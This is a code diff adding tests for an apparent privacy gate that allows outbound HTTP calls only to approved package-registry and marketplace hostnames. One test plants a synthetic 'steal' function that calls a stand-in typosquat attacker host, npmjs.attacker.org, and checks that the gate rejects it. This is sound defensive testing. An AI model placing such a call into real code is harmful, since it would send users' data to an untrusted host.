@@ -103,6 +103,112 @@ class TestPrivacyGateAllowedHostnames:
         )
         assert result.returncode == 0, f"stderr={result.stderr!r}"
 
+    def test_passes_with_npm_registry_concat_get(self, tmp_path: Path) -> None:
+        """P2.6 reputation: npm registry literal-prefix concat is verifiable."""
+        result = _run_script_with_synthetic_surface(
+            tmp_path,
+            {
+                "npm_client.py": (
+                    "import urllib.request\n"
+                    "def fetch(pkg):\n"
+                    '    return urllib.request.urlopen("https://registry.npmjs.org/" + pkg, timeout=10)\n'
+                ),
+            },
+        )
+        assert result.returncode == 0, f"stderr={result.stderr!r}"
+
+    def test_passes_with_npm_downloads_concat_get(self, tmp_path: Path) -> None:
+        """P2.6 reputation: api.npmjs.org weekly download counts."""
+        result = _run_script_with_synthetic_surface(
+            tmp_path,
+            {
+                "npm_dl.py": (
+                    "import urllib.request\n"
+                    "def fetch(pkg):\n"
+                    "    return urllib.request.urlopen("
+                    '"https://api.npmjs.org/downloads/point/last-week/" + pkg, timeout=10)\n'
+                ),
+            },
+        )
+        assert result.returncode == 0, f"stderr={result.stderr!r}"
+
+    def test_passes_with_pypi_org_request_wrapped(self, tmp_path: Path) -> None:
+        """P2.6 reputation: pypi.org existence via urlopen(Request(literal + var))."""
+        result = _run_script_with_synthetic_surface(
+            tmp_path,
+            {
+                "pypi_client.py": (
+                    "from urllib.request import Request, urlopen\n"
+                    "def fetch(pkg):\n"
+                    '    return urlopen(Request("https://pypi.org/pypi/" + pkg + "/json"), timeout=10)\n'
+                ),
+            },
+        )
+        assert result.returncode == 0, f"stderr={result.stderr!r}"
+
+    def test_passes_with_pypistats_concat(self, tmp_path: Path) -> None:
+        """P2.6 reputation: pypistats.org weekly download counts (3rd-party)."""
+        result = _run_script_with_synthetic_surface(
+            tmp_path,
+            {
+                "pypistats.py": (
+                    "import urllib.request\n"
+                    "def fetch(pkg):\n"
+                    "    return urllib.request.urlopen("
+                    '"https://pypistats.org/api/packages/" + pkg + "/recent", timeout=10)\n'
+                ),
+            },
+        )
+        assert result.returncode == 0, f"stderr={result.stderr!r}"
+
+    def test_passes_with_chrome_web_store_body_fetch(self, tmp_path: Path) -> None:
+        """P2.6 reputation: Chrome Web Store extension HEAD/body (dormant in P2.6)."""
+        result = _run_script_with_synthetic_surface(
+            tmp_path,
+            {
+                "chrome.py": (
+                    "from urllib.request import Request, urlopen\n"
+                    "def fetch(ext_id):\n"
+                    "    return urlopen("
+                    'Request("https://chrome.google.com/webstore/detail/" + ext_id), timeout=10)\n'
+                ),
+            },
+        )
+        assert result.returncode == 0, f"stderr={result.stderr!r}"
+
+    def test_passes_with_vscode_marketplace_post(self, tmp_path: Path) -> None:
+        """P2.6 reputation: VSCode Marketplace extensionquery (dormant in P2.6)."""
+        result = _run_script_with_synthetic_surface(
+            tmp_path,
+            {
+                "vscode.py": (
+                    "from urllib.request import Request, urlopen\n"
+                    "def fetch(body):\n"
+                    "    return urlopen(Request("
+                    '"https://marketplace.visualstudio.com/_apis/public/gallery/extensionquery", '
+                    'data=body, method="POST"), timeout=10)\n'
+                ),
+            },
+        )
+        assert result.returncode == 0, f"stderr={result.stderr!r}"
+
+    def test_fails_when_attacker_adds_disallowed_subdomain(self, tmp_path: Path) -> None:
+        """A hypothetical typosquat (npmjs.attacker.org) MUST still be rejected
+        even though it contains "npmjs" — the gate uses exact hostname match,
+        not substring."""
+        result = _run_script_with_synthetic_surface(
+            tmp_path,
+            {
+                "evil.py": (
+                    "import urllib.request\n"
+                    "def steal(pkg):\n"
+                    '    return urllib.request.urlopen("https://npmjs.attacker.org/" + pkg, timeout=10)\n'
+                ),
+            },
+        )
+        assert result.returncode == 1
+        _assert_gate_flagged_hostname(result, "npmjs.attacker.org")
+
     def test_passes_with_no_http_at_all(self, tmp_path: Path) -> None:
         """Pure CPU code with no HTTP imports is trivially clean."""
         result = _run_script_with_synthetic_surface(
